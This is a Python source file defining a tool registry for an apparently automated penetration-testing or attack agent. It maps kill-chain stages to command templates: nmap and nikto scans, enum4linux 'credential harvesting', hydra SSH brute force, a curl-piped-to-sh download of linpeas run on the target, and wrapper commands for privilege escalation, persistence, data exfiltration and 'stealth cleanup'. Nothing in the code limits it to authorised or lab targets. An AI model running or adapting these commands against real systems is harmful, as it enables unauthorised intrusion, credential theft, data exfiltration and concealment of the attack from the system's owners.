#!/usr/bin/env python3

import shutil
from typing import List, Dict

class ToolRegistry:
    def __init__(self):
        # Map high-level tasks to a list of potential CLI commands
        # Each entry is (command_template, binary_name_to_check)
        self.task_map = {
            "service_discovery": [
                ("nmap -Pn -sV --top-ports 1000 {target}", "nmap"),
                ("rustscan -a {target} -- -sV", "rustscan"),
            ],
            "vulnerability_assessment": [
                ("nmap -Pn -sV -sC --script=vuln {target}", "nmap"),
                ("nikto -h {target}", "nikto"),
            ],
            "credential_harvesting": [
                ("enum4linux -a {target}", "enum4linux"),
            ],
            "test_credentials": [
                ("hydra -L users.txt -P pass.txt ssh://{target}", "hydra"),
            ],
            "find_privesc_vectors": [
                ("ssh_exec {target} {user} {password} 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh'", "ssh"),
            ],
            "exploit_privesc": [
                ("killchain_privesc {target} {user} {password}", "killchain_privesc"),
            ],
            "establish_persistence": [
                ("killchain_persist {target} {user} {password}", "killchain_persist"),
            ],
            "exfiltrate_data": [
                ("killchain_exfil {target} {user} {password}", "killchain_exfil"),
            ],
            "stealth_cleanup": [
                ("killchain_cleanup {target} {user} {password}", "killchain_cleanup"),
            ],
            "analyze_vulnerabilities": [
                # AnalysisAgent doesn't run CLI tools — this is handled by the agent itself
            ],
        }
        
        # Cache of available tools (checked once)
        self._available_cache = {}

    def _is_tool_available(self, binary_name: str) -> bool:
        """Check if a CLI tool is installed and available in PATH."""
        if binary_name in self._available_cache:
            return self._available_cache[binary_name]
        available = shutil.which(binary_name) is not None
        self._available_cache[binary_name] = available
        return available

    def get_commands_for_task(self, task: str, target: str, user: str = "root", password: str = "") -> List[str]:
        """
        Translate a conceptual task into concrete CLI commands.
        Only returns commands whose binary is actually installed.
        """
        entries = self.task_map.get(task, [])
        formatted_cmds = []
        skipped = []
        
        for cmd_template, binary_name in entries:
            if self._is_tool_available(binary_name):
                formatted_cmds.append(cmd_template.format(
                    target=target,
                    user=user,
                    password=password
                ))
            else:
                skipped.append(binary_name)
        
        if skipped:
            print(f"     [!] Skipped unavailable tools: {', '.join(skipped)}")
        
        if not formatted_cmds and entries:
            print(f"     [!] WARNING: No tools available for task '{task}'")
            
        return formatted_cmds
    
    def has_task(self, task: str) -> bool:
        """Check if a task is registered."""
        return task in self.task_map
    
    def get_available_tools_summary(self) -> Dict[str, List[str]]:
        """Return a summary of which tools are available for which tasks."""
        summary = {}
        for task, entries in self.task_map.items():
            available = []
            for _, binary_name in entries:
                if self._is_tool_available(binary_name):
                    available.append(binary_name)
            summary[task] = available
        return summary
